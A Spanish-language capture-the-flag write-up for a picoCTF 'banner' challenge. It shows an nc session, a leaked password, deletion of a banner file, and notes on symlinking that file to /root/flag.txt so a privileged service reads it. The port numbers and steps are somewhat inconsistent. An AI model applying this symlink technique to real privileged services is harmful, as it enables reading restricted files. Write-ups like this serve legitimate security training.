
# Descripción 
Can you abuse the banner?

The server has been leaking some crucial information on `tethys.picoctf.net 49701`. Use the leaked information to get to the server.

To connect to the running application use `nc tethys.picoctf.net 54338`. From the above information abuse the machine and find the flag in the /root directory.

# Solución 

1. Nos conectamos al puerto:

```
nc tethys.picoctf.net 53538
```

2.  Respondemos las preguntas:

```
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper

```

3. Eliminamos el banner:

```
rm /home/player/banner
```

4.  Salimos del puerto:

```
exit
logout
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ exit 
exit
logout
What is the top cyber security conference in the world?
^C
```

5. Nos volvemos a conectar al puerto y aparace la flag:

```
┌──(daniel㉿kali)-[~]
└─$ nc tethys.picoctf.net 53538
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}

what is the password? 

```

# Notas adicionales
- El servicio muestra un "banner" al conectarse, que se lee del archivo `/home/player/banner`

- Al reemplazar ese archivo con un **enlace simbólico** a `/root/flag.txt`, el programa (que se ejecuta con privilegios elevados) lee el flag en lugar del banner original

- Es una técnica clásica de **path traversal mediante symlinks** para leer archivos restringidos

# Referencias
- [GTFOBins - Symlink technique](https://gtfobins.github.io/)